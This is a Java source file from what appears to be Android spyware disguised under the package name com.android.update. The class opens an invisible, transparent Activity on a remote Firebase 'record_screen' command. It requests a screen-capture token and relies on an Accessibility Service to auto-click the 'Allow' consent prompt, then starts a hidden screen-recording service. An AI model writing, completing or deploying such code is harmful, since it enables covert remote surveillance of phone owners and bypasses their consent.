package com.android.update;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;

/**
 * Transparent Activity used solely to obtain a MediaProjection token
 * (Android requires an Activity context for createScreenCaptureIntent).
 * This is triggered by the Firebase "record_screen" command.
 * It appears invisible to the user.
 */
public class MediaProjectionActivity extends Activity {

    private static final String TAG = "MediaProjActivity";
    private static final int REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Completely transparent window — user sees nothing
        MediaProjectionManager pm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        // The Accessibility Service's autoClickAllow() will auto-click "Allow"/"Start"
        startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            Log.d(TAG, "MediaProjection granted — starting ScreenRecordService");
            Intent serviceIntent = new Intent(this, ScreenRecordService.class);
            serviceIntent.putExtra(ScreenRecordService.EXTRA_RESULT_CODE, resultCode);
            serviceIntent.putExtra(ScreenRecordService.EXTRA_DATA, data);
            startForegroundService(serviceIntent);
        } else {
            Log.e(TAG, "MediaProjection denied or cancelled");
        }
        finish(); // Always close this transparent activity
    }
}
